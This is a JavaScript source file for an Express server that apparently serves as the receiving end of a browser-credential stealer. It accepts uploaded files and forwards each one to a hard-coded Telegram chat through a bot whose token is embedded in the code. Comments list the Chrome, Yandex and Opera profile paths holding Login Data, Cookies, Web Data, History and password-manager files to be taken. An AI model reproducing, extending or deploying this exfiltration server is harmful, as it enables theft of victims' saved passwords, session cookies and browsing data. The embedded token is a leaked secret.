'use strict';
const express = require('express');
const busboy = require('connect-busboy');
const fs = require('fs'); 
const telegramBot = require('node-telegram-bot-api');
const token = '1454988820:AAE2ajg_3_P4N2htYTRjZTL3cYiILjEhbXA';
const server = express();
const port = 8383;
const bot = new telegramBot(token, {polling: true});
const chatId = 916403283;
let id = 0;

server.get('/', (req, res)=>{
    bot.sendDocument(chatId, './data/Web Data 10');
});

server.use(busboy());
server.route('/upload').post((req, res) => {
        req.pipe(req.busboy);
        req.busboy.on('file', (fieldname, file, filename)=> {
            id++;
            console.log(`Uploading ${fieldname}: ${filename}`);
            bot.sendMessage(chatId, `Uploading ${fieldname}: ${filename}`);

            let fstream = fs.createWriteStream(__dirname + '/data/' + filename + ` ${fieldname} (${id})`);
            file.pipe(fstream);
            fstream.on('close', (err)=> {  
                if(err) {
                    console.log(`Upload ${fieldname} of ${filename} failed`);
                    bot.sendMessage(chatId, `Upload ${fieldname} of ${filename} failed`);      
                    res.sendStatus(400); 
                }
                else {
                    console.log(`Upload ${fieldname} of ${filename} finished`);
                    bot.sendDocument(chatId, './data/' + filename + ` ${fieldname} (${id})`);              
                    res.sendStatus(200); 
                }                  
            });
        });
    });
if(!fs.existsSync('data')) fs.mkdirSync('data');
server.listen(port, ()=>{ console.log("Server is creared on port " + port) });

/* C:\Users\Shon2\AppData\Local\Google\Chrome\User Data\Default
Web Data
Cookies
History
Login Data
*/
/* C:\Users\Shon2\AppData\Local\Yandex\YandexBrowser\User Data\Default
Cookies
History
Web Data
Ya Passman Data
*/
/*C:\Users\Shon2\AppData\Roaming\Opera Software\Opera GX Stable || C:\Users\Shon2\AppData\Roaming\Opera Software\Opera Stable
Web Data
Cookies
History
Login Data
*/